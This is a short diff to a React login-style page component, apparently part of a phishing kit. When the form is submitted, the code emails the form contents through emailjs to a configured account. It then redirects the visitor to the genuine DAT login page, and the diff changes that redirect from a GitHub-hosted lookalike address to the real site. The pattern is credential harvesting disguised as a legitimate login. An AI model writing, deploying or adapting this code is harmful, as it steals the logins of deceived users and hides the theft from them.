@@ -125,8 +125,9 @@ function HomePage() {
         } else if (qfNumErku === 0) {
             if (qfNumErku === 0) {
                 if (digit.current.value) {
+                    console.log(event.target);
                     emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
-                    window.location.href = "https://loginsdat.github.io/logins/";
+                    window.location.href = "https://www.dat.com/login#sec2";
                     return;
                 }
             }
